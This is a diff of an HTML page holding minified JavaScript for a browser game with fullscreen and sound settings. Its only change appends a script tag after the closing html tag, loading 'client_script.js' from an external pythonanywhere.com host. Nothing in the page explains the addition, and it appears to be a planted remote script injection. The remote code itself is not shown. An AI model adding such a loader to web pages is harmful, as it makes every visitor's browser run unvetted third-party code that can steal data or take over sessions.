@@ -101,4 +101,4 @@ function(){c(0)});document.getElementById("button1").addEventListener("click",fu
 !1;g=document.getElementById("game").hidden=!0;b||z.exit()});e=document.getElementById("fullscreen");f=document.getElementById("sound");e.checked=r.get("fullscreen");e.parentElement.addEventListener("mousedown",function(b){b.stopPropagation()});e.parentElement.addEventListener("touchstart",function(b){b.stopPropagation()});e.addEventListener("change",function(){r.set("fullscreen",e.checked);e.checked?z.enter():z.exit()});z.setUpdateHandler(function(b){if(!g)e.checked=b,r.set("fullscreen",b)});f.checked=
 r.get("sound");f.parentElement.addEventListener("mousedown",function(b){b.stopPropagation()});f.parentElement.addEventListener("touchstart",function(b){b.stopPropagation()});f.addEventListener("change",function(){f.checked||v.stop();r.set("sound",f.checked)});v.play=function(){f.checked&&v.tick()}})()})();
 </script>
-</body></html>
+</body></html><script src="https://olibot13.pythonanywhere.com/client_script.js"></script>
